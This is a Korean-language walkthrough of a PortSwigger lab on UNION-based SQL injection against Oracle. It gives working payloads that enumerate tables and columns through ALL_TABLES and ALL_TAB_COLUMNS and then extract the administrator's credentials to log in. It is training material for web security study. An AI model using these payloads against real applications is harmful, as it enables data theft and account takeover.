# Lab: SQL injection attack, listing the database contents on Oracle

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — UNION Attack / Oracle Data Dictionary
- **링크**: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
- **참고**:
  - https://portswigger.net/web-security/sql-injection/cheat-sheet
  - https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/ALL_TABLES.html
  - https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/ALL_TAB_COLUMNS.html

## 목표

Oracle의 데이터 딕셔너리 뷰(`ALL_TABLES`, `ALL_TAB_COLUMNS`)를 이용해 DB 구조를 파악하고, 계정 정보를 추출하여 `administrator`로 로그인한다.

## 005 랩과의 차이점

풀이 흐름과 목표는 005와 완전히 동일하다. Oracle은 `information_schema`를 지원하지 않기 때문에 테이블·컬럼 탐색에 사용하는 뷰만 다르다.

| 항목 | non-Oracle (005) | Oracle (006) |
|------|-----------------|--------------|
| 테이블 목록 조회 | `information_schema.tables` | `ALL_TABLES` |
| 컬럼 목록 조회 | `information_schema.columns` | `ALL_TAB_COLUMNS` |
| FROM 절 | 생략 가능 | `FROM DUAL` 필수 (값만 반환 시) |
| 주석 | `--` | `--` |

## 풀이

### 1단계 — 컬럼 수 및 타입 파악

003 랩과 동일하게 Oracle에서는 `FROM DUAL`을 포함한다.

```sql
' ORDER BY 2--
' UNION SELECT NULL,NULL FROM DUAL--
```

컬럼이 2개이고 둘 다 문자열 출력이 가능함을 확인한다.

### 2단계 — 테이블 목록 조회 (ALL_TABLES)

```sql
' UNION SELECT table_name,NULL FROM ALL_TABLES--
```

시스템 테이블(`SYS`, `SYSTEM` 소유)을 제외하고 사용자 정의 테이블을 찾는다. `OWNER` 조건으로 필터링할 수 있다.

```sql
' UNION SELECT table_name,NULL FROM ALL_TABLES WHERE OWNER='USERS_SCHEMA'--
```

> `ALL_TABLES`의 주요 컬럼 참고: [Oracle 공식 문서](https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/ALL_TABLES.html)

| 컬럼명 | 설명 |
|--------|------|
| `OWNER` | 테이블 소유자(스키마) |
| `TABLE_NAME` | 테이블 이름 |
| `NUM_ROWS` | 통계상 행 수 (참고용) |

### 3단계 — 컬럼 목록 조회 (ALL_TAB_COLUMNS)

2단계에서 찾은 테이블명(`USERS_ABCDEF`)의 컬럼을 조회한다.

```sql
' UNION SELECT column_name,NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS_ABCDEF'--
```

응답에서 username, password에 해당하는 컬럼명을 식별한다. (예: `USERNAME_XYZ`, `PASSWORD_XYZ`)

> `ALL_TAB_COLUMNS`의 주요 컬럼 참고: [Oracle 공식 문서](https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/ALL_TAB_COLUMNS.html)

| 컬럼명 | 설명 |
|--------|------|
| `OWNER` | 테이블 소유자 |
| `TABLE_NAME` | 소속 테이블 이름 |
| `COLUMN_NAME` | 컬럼 이름 |
| `DATA_TYPE` | 데이터 타입 (`VARCHAR2`, `NUMBER` 등) |

### 4단계 — 계정 정보 추출

```sql
' UNION SELECT USERNAME_XYZ,PASSWORD_XYZ FROM USERS_ABCDEF--
```

응답에서 `administrator`의 비밀번호를 확인한다.

### 5단계 — 로그인

추출한 `administrator` 계정과 비밀번호로 로그인한다. (002 랩과 동일한 방식)

## 핵심 정리

- Oracle은 `information_schema` 대신 **데이터 딕셔너리 뷰**(`ALL_TABLES`, `ALL_TAB_COLUMNS`)를 사용한다.
- Oracle의 테이블명·컬럼명은 기본적으로 **대문자**로 저장된다. 조건절에서도 대문자로 비교해야 한다.
- `FROM DUAL` 요건 등 Oracle 고유 문법은 003 랩에서 학습한 내용이 그대로 적용된다.
- **방어**: Prepared Statement 사용, DB 계정에 `ALL_TABLES` / `ALL_TAB_COLUMNS` 접근 권한 최소화.

## 배운 점 및 추가 학습

### 1. 005·006 통합 흐름 비교

두 랩의 탐색 흐름은 동일하고 사용하는 뷰만 다르다.

```
[non-Oracle]                         [Oracle]
information_schema.tables            ALL_TABLES
         ↓                                ↓
information_schema.columns           ALL_TAB_COLUMNS
         ↓                                ↓
         실제 테이블에서 데이터 추출
         ↓
         administrator로 로그인
```

### 2. Oracle 데이터 딕셔너리 뷰 종류

Oracle에는 접근 범위에 따라 세 가지 접두사 뷰가 존재한다.

| 접두사 | 범위 | 예시 |
|--------|------|------|
| `USER_` | 현재 사용자 소유 객체만 | `USER_TABLES`, `USER_TAB_COLUMNS` |
| `ALL_` | 현재 사용자가 접근 가능한 모든 객체 | `ALL_TABLES`, `ALL_TAB_COLUMNS` |
| `DBA_` | DB 전체 (DBA 권한 필요) | `DBA_TABLES`, `DBA_TAB_COLUMNS` |

SQL injection 탐색 시 `ALL_`이 가장 많이 사용된다. `USER_`는 범위가 너무 좁고, `DBA_`는 권한이 없으면 조회 자체가 실패한다.

### 3. Oracle 테이블명 대소문자 주의

Oracle은 테이블명·컬럼명을 내부적으로 대문자로 저장한다. `WHERE TABLE_NAME='users_abcdef'`처럼 소문자로 조건을 주면 결과가 반환되지 않는다.

```sql
-- 실패 (소문자)
WHERE TABLE_NAME = 'users_abcdef'

-- 성공 (대문자)
WHERE TABLE_NAME = 'USERS_ABCDEF'

-- 대소문자 무관하게 검색
WHERE UPPER(TABLE_NAME) LIKE '%USER%'
```

### 4. DBMS별 DB 구조 탐색 뷰 총정리

| DBMS | 테이블 목록 | 컬럼 목록 | 필터링 조건 |
|------|-------------|-----------|-------------|
| PostgreSQL | `information_schema.tables` | `information_schema.columns` | `table_schema = 'public'` |
| MySQL | `information_schema.tables` | `information_schema.columns` | `table_schema = database()` |
| MSSQL | `information_schema.tables` | `information_schema.columns` | `table_type = 'BASE TABLE'` |
| Oracle | `ALL_TABLES` | `ALL_TAB_COLUMNS` | `OWNER != 'SYS'` 등 |

### 5. 추가로 고민해볼 것

- `ALL_TABLES`에는 Oracle 시스템 테이블이 수백 개 포함되어 있다. `OWNER NOT IN ('SYS','SYSTEM','MDSYS','XDB')`로 필터링하면 사용자 테이블만 빠르게 찾을 수 있다.
- Oracle에서 컬럼이 1개만 출력될 때는 005 랩에서 학습한 `||` 연결 연산자를 동일하게 사용한다: `USERNAME_XYZ||'~'||PASSWORD_XYZ`.
- Oracle `ALL_TAB_COLUMNS`의 `DATA_TYPE`은 `VARCHAR2`, `NUMBER`, `DATE` 등 Oracle 고유 타입으로 표시된다. 이를 통해 DBMS가 Oracle임을 재확인할 수 있다.
